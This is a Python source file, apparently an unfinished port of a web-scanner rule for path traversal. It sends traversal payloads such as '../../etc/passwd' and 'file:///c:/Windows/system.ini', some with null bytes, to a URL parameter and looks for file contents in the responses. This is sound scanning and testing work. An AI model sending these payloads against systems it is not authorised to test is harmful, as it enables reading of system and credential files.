import re
import logging
import requests
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs
from src.passive_scan.passive_scan_rules.utils.alert import Alert

class PathTraversalScanRule:

    NON_EXISTANT_FILENAME = "thishouldnotexistandhopefullyitwillnot"
    
    WIN_PATTERN = re.compile(r"\[drivers\]")
    WIN_LOCAL_FILE_TARGETS = [
        "c:/Windows/system.ini",
        "../../../../../../../../../../../../../../../../Windows/system.ini",
        "c:\\Windows\\system.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini",
        "/../../../../../../../../../../../../../../../../Windows/system.ini",
        "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini",
        "Windows/system.ini",
        "Windows\\system.ini",
        "file:///c:/Windows/system.ini",
        "file:///c:\\Windows\\system.ini",
        "file:\\\\\\c:\\Windows\\system.ini",
        "file:\\\\\\c:/Windows/system.ini",
        "d:\\Windows\\system.ini",
        "d:/Windows/system.ini",
        "file:///d:/Windows/system.ini",
        "file:///d:\\Windows\\system.ini",
        "file:\\\\\\d:\\Windows\\system.ini",
        "file:\\\\\\d:/Windows/system.ini"
    ]
    
    NIX_PATTERN = re.compile(r"root:.:0:0")
    NIX_LOCAL_FILE_TARGETS = [
        "/etc/passwd",
        "../../../../../../../../../../../../../../../../etc/passwd",
        "/../../../../../../../../../../../../../../../../etc/passwd",
        "etc/passwd",
        "file:///etc/passwd",
        "file:\\\\\\etc/passwd"
    ]
    
    DIR_PATTERN = re.compile(r"(etc|bin|boot)")
    LOCAL_DIR_TARGETS = [
        "c:/",
        "/",
        "c:\\",
        "../../../../../../../../../../../../../../../../",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
        "/../../../../../../../../../../../../../../../../",
        "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
        "file:///c:/",
        "file:///c:\\",
        "file:\\\\\\c:\\",
        "file:\\\\\\c:/",
        "file:///",
        "file:\\\\\\",
        "d:\\",
        "d:/",
        "file:///d:/",
        "file:///d:\\",
        "file:\\\\\\d:\\",
        "file:\\\\\\d:/"
    ]
    
    WAR_PATTERN = re.compile(r"</web-app>")
    LOCAL_FILE_RELATIVE_PREFIXES = ["", "/", "\\"]
    LOGGER = logging.getLogger(__name__)
    
    def get_cwe_id(self):
        return 22
    
    def get_wasc_id(self):
        return 33
    
    def scan(self, base_url, param):
        try:
            nix_count = win_count = dir_count = local_traversal_length = 0
            extension = None
            include_null_byte_injection_payload = False
            
            self.LOGGER.debug(f"Attacking at Attack Strength: {self.get_attack_strength()}")
            
            attack_strength = self.get_attack_strength()
            if attack_strength == "LOW":
                nix_count, win_count, dir_count = 2, 2, 2
            elif attack_strength == "MEDIUM":
                nix_count, win_count, dir_count = 2, 4, 4
                local_traversal_length = 1
            elif attack_strength == "HIGH":
                nix_count, win_count, dir_count = 4, 8, 7
                local_traversal_length = 2
            elif attack_strength == "INSANE":
                nix_count = len(self.NIX_LOCAL_FILE_TARGETS)
                win_count = len(self.WIN_LOCAL_FILE_TARGETS)
                dir_count = len(self.LOCAL_DIR_TARGETS)
                local_traversal_length = 4
                include_null_byte_injection_payload = True
            
            self.LOGGER.debug(f"Checking parameter [{param}] for Path Traversal to local files")
            
            # tech_scope = self.check_tech_scope(base_url)
            tech_scope = ["Windows", "Linux", "MacOS", "Tomcat"]
            # Check Windows file targets
            if "Windows" in tech_scope:
                for h in range(win_count):
                    if self.send_and_check_payload(base_url, param, self.WIN_LOCAL_FILE_TARGETS[h], self.WIN_PATTERN, 1) or self.is_stop():
                        return
                    
                    if include_null_byte_injection_payload:
                        if self.send_and_check_payload(base_url, param, self.WIN_LOCAL_FILE_TARGETS[h] + '\x00', self.WIN_PATTERN, 1) or self.is_stop():
                            return
                        if extension:
                            if self.send_and_check_payload(base_url, param, f"{self.WIN_LOCAL_FILE_TARGETS[h]}\x00{extension}", self.WIN_PATTERN, 1) or self.is_stop():
                                return
            
            # Check Unix/Linux file targets
            if "Linux" in tech_scope or "MacOS" in tech_scope:
                for h in range(nix_count):
                    if self.send_and_check_payload(base_url, param, self.NIX_LOCAL_FILE_TARGETS[h], self.NIX_PATTERN, 2) or self.is_stop():
                        return
                    
                    if include_null_byte_injection_payload:
                        if self.send_and_check_payload(base_url, param, self.NIX_LOCAL_FILE_TARGETS[h] + '\x00', self.NIX_PATTERN, 2) or self.is_stop():
                            return
                        if extension:
                            if self.send_and_check_payload(base_url, param, f"{self.NIX_LOCAL_FILE_TARGETS[h]}\x00{extension}", self.NIX_PATTERN, 2) or self.is_stop():
                                return
            
            # Check directory traversal targets
            for h in range(dir_count):
                if self.send_and_check_payload(base_url, param, self.LOCAL_DIR_TARGETS[h], self.DIR_PATTERN, 3) or self.is_stop():
                    return
            
            # Check well-known web application files
            sslash_pattern = "WEB-INF/web.xml"
            bslash_pattern = sslash_pattern.replace('/', '\\')
            
            if "Tomcat" in tech_scope:
                for idx in range(local_traversal_length):
                    if (self.send_and_check_payload(base_url, param, sslash_pattern, self.WAR_PATTERN, 4) or 
                        self.send_and_check_payload(base_url, param, bslash_pattern, self.WAR_PATTERN, 4) or 
                        self.send_and_check_payload(base_url, param, '/' + sslash_pattern, self.WAR_PATTERN, 4) or 
                        self.send_and_check_payload(base_url, param, '\\' + bslash_pattern, self.WAR_PATTERN, 4) or 
                        self.is_stop()):
                        return
                    
                    sslash_pattern = "../" + sslash_pattern
                    bslash_pattern = "..\\" + bslash_pattern
            
            # Check for URL filename traversal
            if self.get_alert_threshold() in ["LOW", "MEDIUM"]:
                msg = self.get_new_msg(base_url)
                self.set_parameter(msg, param, self.NON_EXISTANT_FILENAME)
                try:
                    self.send_and_receive(msg)
                except Exception as ex:
                    self.LOGGER.debug(f"Caught {ex.__class__.__name__} {ex} when accessing: {msg.url}")
                    return
                
                error_pattern = re.compile("Exception|Error", re.IGNORECASE)
                error_matcher = error_pattern.search(msg.response.text)
                urlfilename = urlparse(msg.url).path.split("/")[-1]
                
                if urlfilename and (not self.is_page_200(msg) or error_matcher):
                    self.LOGGER.debug(f"It is possible to check for local file Path Traversal on the url filename on [{msg.method}] [{msg.url}], [{param}]")
                    
                    for prefix in self.LOCAL_FILE_RELATIVE_PREFIXES:
                        if self.is_stop():
                            return
                        
                        prefixed_urlfilename = prefix + urlfilename
                        msg = self.get_new_msg(base_url)
                        self.set_parameter(msg, param, prefixed_urlfilename)
                        
                        try:
                            self.send_and_receive(msg)
                        except Exception as ex:
                            self.LOGGER.debug(f"Caught {ex.__class__.__name__} {ex} when accessing: {msg.url}")
                            continue
                        
                        error_matcher = error_pattern.search(msg.response.text)
                        if self.is_page_200(msg) and not error_matcher:
                            return self.create_unmatched_alert(param, prefixed_urlfilename)
                            
        except Exception as e:
            self.LOGGER.warning(f"An error occurred while checking parameter [{param}] for Path Traversal. Caught {e.__class__.__name__} {e}")
    
    def send_and_check_payload(self, base_url, param, new_value, contents_matcher, check):
        msg = self.get_new_msg(base_url)
        self.set_parameter(msg, param, new_value)
        
        self.LOGGER.debug(f"Checking parameter [{param}] for Path Traversal (local file) with value [{new_value}]")
        
        try:
            self.send_and_receive(msg)
        except Exception as ex:
            self.LOGGER.debug(f"Caught {ex.__class__.__name__} {ex} when accessing: {msg.url}")
            return False
        
        match = contents_matcher.search(msg.response.text)
        if self.is_page_200(msg) and match:
            return self.create_matched_alert(param, new_value, match.group(), check)
            
        
        return False
    
    def get_new_msg(self, base_url):
        return requests.Request('GET', base_url)
    
    def send_and_receive(self, msg):
        prepared = msg.prepare()
        with requests.Session() as session:
            response = session.send(prepared)
            msg.response = response
        return response
    
    def set_parameter(self, msg, param, value):
        url_parts = list(urlparse(msg.url))
        query = dict(parse_qs(url_parts[4]))
        query[param] = value
        url_parts[4] = urlencode(query, doseq=True)
        msg.url = urlunparse(url_parts)
    
    def is_page_200(self, msg):
        return msg.response.status_code == 200
    
    def create_unmatched_alert(self, param, attack):
        return Alert(risk_category="High", msg_ref="ascanrules.pathtraversal")
        # return AlertBuilder().set_confidence("LOW").set_param(param).set_attack(attack).set_alert_ref(f"{self.get_id()}-5")
    
    def create_matched_alert(self, param, attack, evidence, check):
        return Alert(risk_category="High", msg_ref="ascanrules.pathtraversal", evidence=evidence)
        # return AlertBuilder().set_confidence("MEDIUM").set_param(param).set_attack(attack).set_evidence(evidence).set_alert_ref(f"{self.get_id()}-{check}")
    
    # def in_scope(self, tech):
    #     return True  # Placeholder for actual technology scope check
    
    def check_tech_scope(self, base_url):
        """
        Infer the technology used by the server from HTTP headers.
        
        :param base_url: The URL to scan.
        :return: True if the inferred technology is in scope, False otherwise.
        """
        try:
            response = requests.head(base_url, timeout=5)
            server_header = response.headers.get("Server", "")
            powered_by_header = response.headers.get("X-Powered-By", "")

            # if "windows" == tech.lower():
            #     if "windows" in server_header.lower() or "win32" in powered_by_header.lower():
            #         return True              
            # elif "linux" == tech.lower():
            #     if "linux" in server_header.lower() or "unix" in powered_by_header.lower():
            #         return True   
            # elif "macos" == tech.lower():
            #     if "macos" in server_header.lower() or "darwin" in powered_by_header.lower():
            #         return True   
            # elif "tomcat" == tech.lower():
            #     if "tomcat" in server_header.lower():
            #      tech = "Tomcat"
            # else:
            #     return False
            tech = []
            if "windows" in server_header.lower() or "win32" in powered_by_header.lower():
                tech.append("Windows")
            elif "linux" in server_header.lower() or "unix" in powered_by_header.lower():
                tech.append("Linux")
            elif "macos" in server_header.lower() or "darwin" in powered_by_header.lower():
                tech.append("MacOS")
            elif "tomcat" in server_header.lower():
                tech.append("Tomcat")
            else:
                tech.append("Unknown")
            return tech
        except requests.RequestException as e:
            self.LOGGER.debug(f"Error determining scope: {e}")
            return False
        
    def get_attack_strength(self):
        return "INSANE"
    
    def get_alert_threshold(self):
        return "LOW" 
    
    def is_stop(self):
        return False  
    
# class AlertBuilder:
#     def __init__(self):
#         self.alert = {}
    
#     def set_confidence(self, confidence):
#         self.alert['confidence'] = confidence
#         return self
    
#     def set_param(self, param):
#         self.alert['param'] = param
#         return self
    
#     def set_attack(self, attack):
#         self.alert['attack'] = attack
#         return self
    
#     def set_alert_ref(self, alert_ref):
#         self.alert['alert_ref'] = alert_ref
#         return self
    
#     def set_evidence(self, evidence):
#         self.alert['evidence'] = evidence
#         return self
    
#     def set_message(self, msg):
#         self.alert['message'] = msg
#         return self
    
#     def r(self):
#         print("Alert raised:", self.alert)


